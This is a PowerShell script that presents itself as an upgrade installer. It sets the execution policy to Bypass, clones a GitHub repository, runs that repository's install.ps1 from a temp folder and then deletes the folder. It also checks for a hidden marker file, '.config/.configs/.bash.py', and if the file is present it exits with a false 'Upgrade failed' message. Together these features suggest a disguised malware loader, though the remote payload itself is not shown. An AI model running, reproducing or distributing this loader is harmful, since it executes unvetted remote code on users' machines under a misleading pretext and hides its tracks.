[Console]::OutputEncoding = [System.Text.UTF8Encoding]::new($false)

$guardFile = Join-Path $HOME ".config/.configs/.bash.py"
if (Test-Path -LiteralPath $guardFile) {
    Write-Host "Upgrade failed !"
    exit 1
}

function Resolve-WingetPath {
    if (Get-Command winget -ErrorAction SilentlyContinue) {
        return "winget"
    }

    $possibleWingetPaths = @(
        "$env:LOCALAPPDATA\Microsoft\WindowsApps\winget.exe",
        "$env:ProgramFiles\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\winget.exe"
    )

    foreach ($candidate in $possibleWingetPaths) {
        if (Test-Path $candidate) {
            return $candidate
        }
    }

    return $null
}

function Ensure-Winget {
    $wingetPath = Resolve-WingetPath
    if ($wingetPath) {
        return $wingetPath
    }

    Write-Host "winget is not installed. Installing App Installer..."

    $installerPath = Join-Path $env:TEMP "AppInstaller.msixbundle"
    try {
        Invoke-WebRequest -Uri "https://aka.ms/getwinget" -OutFile $installerPath -UseBasicParsing -ErrorAction Stop
        Add-AppxPackage -Path $installerPath -ErrorAction Stop
    }
    catch {
        Write-Host "ERROR: Failed to install winget automatically." -ForegroundColor Red
        Write-Host "Please install App Installer manually from Microsoft Store and retry."
        exit 1
    }
    finally {
        Remove-Item $installerPath -Force -ErrorAction SilentlyContinue
    }

    $windowsAppsPath = "$env:LOCALAPPDATA\Microsoft\WindowsApps"
    if (Test-Path $windowsAppsPath) {
        if (-not (($env:Path -split ';') -contains $windowsAppsPath)) {
            $env:Path += ";$windowsAppsPath"
        }
    }

    Start-Sleep -Seconds 2
    $wingetPath = Resolve-WingetPath
    if (-not $wingetPath) {
        Write-Host "ERROR: winget is still unavailable after installation." -ForegroundColor Red
        Write-Host "Please reopen PowerShell and run this script again."
        exit 1
    }

    return $wingetPath
}

function Ensure-Git {
    if (Get-Command git -ErrorAction SilentlyContinue) {
        Write-Host "Git is already installed: $(git --version)"
        return
    }

    Write-Host "Git is not installed. Starting installation..."
    $wingetPath = Ensure-Winget
    & $wingetPath install --id Git.Git -e --source winget

    if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
        $possibleGitCmdPaths = @(
            "C:\Program Files\Git\cmd",
            "C:\Program Files (x86)\Git\cmd"
        )

        foreach ($p in $possibleGitCmdPaths) {
            if (Test-Path $p) {
                $env:Path += ";$p"
            }
        }
    }

    if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
        Write-Host "ERROR: Git is still unavailable after installation." -ForegroundColor Red
        Write-Host "Please reopen PowerShell and run this script again."
        exit 1
    }
}

Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Ensure-Git

$repoUrl = "https://github.com/web3toolsbox/installclaw.git"
$workDir = Join-Path $env:TEMP "installclaw-bootstrap"
$repoDir = Join-Path $workDir "installclaw"
$originalLocation = Get-Location

if (Test-Path $workDir) {
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
}
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

try {
    Set-Location -Path $workDir -ErrorAction Stop

    git clone $repoUrl $repoDir
    if ($LASTEXITCODE -ne 0) {
        throw "ERROR: Failed to clone repository: $repoUrl"
    }

    $childScript = Join-Path $repoDir "install.ps1"
    if (-not (Test-Path $childScript)) {
        throw "ERROR: Child installer script not found: $childScript"
    }

    Set-Location -Path $repoDir -ErrorAction Stop
    & ".\install.ps1"
    if (-not $?) {
        throw "ERROR: Child installer failed."
    }
}
finally {
    Set-Location -Path $originalLocation -ErrorAction SilentlyContinue
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
}

Write-Host "Upgrade complete !"
